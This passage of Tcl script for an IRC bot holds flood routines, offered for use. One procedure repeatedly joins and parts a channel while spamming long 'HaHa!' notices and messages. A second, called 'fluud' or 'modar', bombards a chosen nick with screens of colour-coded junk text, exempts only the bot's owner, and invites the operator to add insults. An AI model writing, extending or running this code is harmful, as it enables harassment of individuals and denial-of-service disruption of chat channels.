puthelp "NOTICE $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "JOIN $chan"
puthelp "PRIVMSG $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "JOIN $chan"
puthelp "NOTICE $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "JOIN $chan"
puthelp "PRIVMSG $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "JOIN $chan"
puthelp "NOTICE $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "JOIN $chan"
puthelp "PRIVMSG $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :$rest, HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
putlog "$notc !$hand! Flood joinpart $chan"
return 0
}
if {$rest==""} {
puthelp "JOIN $chan"
puthelp "NOTICE $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "JOIN $chan"
puthelp "PRIVMSG $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "JOIN $chan"
puthelp "NOTICE $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "JOIN $chan"
puthelp "PRIVMSG $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "JOIN $chan"
puthelp "NOTICE $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "JOIN $chan"
puthelp "PRIVMSG $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PART $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
putlog "$notc !$hand! Flood joinpart $chan"
return 0
}
}
## public cmd flood joinpart -- stop
## public cmd flood fluud -- start
proc msg_fluud {nick uhost hand rest} {
pub_fluud $nick $uhost $hand "*" $rest
}
proc pub_fluud {nick uhost hand channel rest} {
global notc ps owner
set person [lindex $rest 0]
set rest [lrange $rest 1 end]
if {[string tolower $person]==[string tolower $ps] || [string tolower $person]==[string tolower $owner]} {
return 0
}
if {[string first # $person]==0} {
puthelp "NOTICE $nick :$notc  Usage: modar <nick> <*add your insult to injury is better :)*>"
return 0
}
if {$rest!=""} {
puthelp "PRIVMSG $person :$rest ,3,9|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@8,12#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "NOTICE $person :$rest ,8,1|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@2,13#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "PRIVMSG $person :$rest ,13,4|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@0,3#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "NOTICE $person :$rest ,10,12|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@14,5#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "PRIVMSG $person :$rest ,3,9|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@8,12#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "NOTICE $person :$rest ,8,1|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@2,13#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "PRIVMSG $person :$rest ,13,4|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@0,3#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "NOTICE $person :$rest ,10,12|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@14,5#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
putlog "!$hand! modar $person"
return 0
}
if {$rest==""} {
puthelp "PRIVMSG $person :3,9|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@8,12#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "NOTICE $person :8,1|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@2,13#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "PRIVMSG $person :13,4|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@0,3#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "NOTICE $person :10,12|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@14,5#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
